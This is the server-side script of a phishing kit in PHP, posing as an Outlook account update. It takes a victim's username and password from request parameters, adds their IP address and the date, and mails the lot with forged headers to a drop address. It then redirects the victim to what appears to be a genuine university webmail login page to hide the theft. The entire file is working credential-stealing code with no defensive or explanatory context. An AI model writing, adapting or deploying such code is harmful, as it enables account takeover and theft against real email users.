<title>Sending...</title>
<?php

$user=$_GET['user'];
$pass=$_GET['pass'];
$from='new@newmail.com';
$ip = getenv("REMOTE_ADDR");
$datamasii=date("D M d, Y g:i a");

$body="Account update details:\n
Name: $user \n
Password: $pass \n
IP: $ip \n
Date: $datamasii";

$subject = "Outlook Update Received";

$headers4="$from";  
$headers.="Reply-to: $headers4\n";
$headers .= "From: $headers4\n"; 
$headers .= "Errors-to: $headers4\n";
$headers .= "Return-Path: $headers4\n"; 
$headers .= "Message-ID: $headers4\n"; 
$headers .= "Received: $headers4\n";

$res=mail("youremail@ymail.com","Outlook Update Details","$body","$headers");

if($res){
print "<script>";
print " self.location='https://email.campus.uvt.nl/CookieAuth.dll?GetLogon?curl=Z2FowaZ2F&reason=0&formdir=1';"; 
print "</script>";

}else{
echo " Error!";
}

?>